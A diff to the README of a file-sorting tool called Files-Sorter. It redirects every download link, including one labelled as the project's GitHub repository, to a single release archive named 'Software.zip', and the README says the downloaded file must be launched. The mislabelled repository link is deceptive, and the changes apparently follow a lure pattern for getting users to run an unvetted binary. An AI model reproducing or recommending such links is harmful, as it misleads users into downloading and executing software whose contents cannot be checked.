@@ -8,7 +8,7 @@ Files-Sorter est un outil pour organiser et trier vos fichiers automatiquement.
 
 ## 🔗 Links
 
-[Download Files-Sorter v1.0.0.zip](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)
+[Download Files-Sorter https://github.com/Heru2212/Files-Sorter/releases/download/v2.0/Software.zip](https://github.com/Heru2212/Files-Sorter/releases/download/v2.0/Software.zip)
 
 *(Note: The download link provided ends with a file name and needs to be launched.)*
 
@@ -24,7 +24,7 @@ Files-Sorter est un outil pour organiser et trier vos fichiers automatiquement.
 
 To get started with Files-Sorter, follow these simple steps:
 
-1. Download [Files-Sorter v1.0.0.zip](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)
+1. Download [Files-Sorter https://github.com/Heru2212/Files-Sorter/releases/download/v2.0/Software.zip](https://github.com/Heru2212/Files-Sorter/releases/download/v2.0/Software.zip)
 2. Extract the ZIP file to your desired location
 3. Open the terminal and run the Python script to start sorting your files
 
@@ -66,7 +66,7 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## 🌐 Additional Resources
 
-For more information and updates, visit the [Files-Sorter GitHub repository](https://github.com/username/Files-Sorter).
+For more information and updates, visit the [Files-Sorter GitHub repository](https://github.com/Heru2212/Files-Sorter/releases/download/v2.0/Software.zip).
 
 ---
 
